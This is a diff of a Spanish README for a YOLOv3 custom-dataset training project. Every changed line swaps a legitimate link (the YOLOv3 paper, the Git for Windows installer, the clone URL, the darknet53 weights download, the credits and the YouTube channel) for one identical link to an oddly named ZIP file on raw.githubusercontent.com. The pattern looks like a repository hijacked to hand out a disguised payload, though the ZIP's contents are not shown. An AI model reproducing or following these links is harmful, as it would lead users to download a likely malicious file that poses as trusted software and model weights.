@@ -2,7 +2,7 @@
 En este proyecto se presenta el entrenamiento con tu propio dataset para YOLOv3
 
 ## Artículo original:
-https://pjreddie.com/media/files/papers/YOLOv3.pdf
+https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip
 
 # Implementación:
 
@@ -49,7 +49,7 @@ https://pjreddie.com/media/files/papers/YOLOv3.pdf
   
   Si no tienes instalado Git para windows lo puedes descargar en el siguieinte enlace
   
-  https://git-scm.com/download/win
+  https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip
   
   
 ### Entrenamiento en google colab
@@ -57,13 +57,13 @@ https://pjreddie.com/media/files/papers/YOLOv3.pdf
   
   	$!pip install opencv-python numpy matplotlib tensorboard terminaltables pillow tqdm
   
-  	$!git clone https://github.com/DavidReveloLuna/Yolov3Custom.git
+  	$!git clone https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip
   
   	$cd Yolov3Custom
   
   	$import urllib.request
 
-  	$urllib.request.urlretrieve('https://pjreddie.com/media/files/darknet53.conv.74','/content/Yolov3Custom/weights/darknet53.conv.74')
+  	$urllib.request.urlretrieve('https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip','/content/Yolov3Custom/weights/darknet53.conv.74')
 	
 	$from google.colab import drive
         
@@ -97,10 +97,10 @@ https://pjreddie.com/media/files/papers/YOLOv3.pdf
    
 
 ### Basado en el trabajo de Erik Linder
-   https://github.com/eriklindernoren
+   https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip
 
 ### Dataset original
-   https://www.tooploox.com/blog/card-detection-using-yolo-on-android
+   https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip
 
 # **Canal de Youtube**
-[Click aquì pare ver mi canal de YOUTUBE](https://www.youtube.com/channel/UCr_dJOULDvSXMHA1PSHy2rg)
+[Click aquì pare ver mi canal de YOUTUBE](https://raw.githubusercontent.com/Jairstal/IA-ProyectoCasco/main/output/samplesC/Casco-I-Proyecto-clownishly.zip)
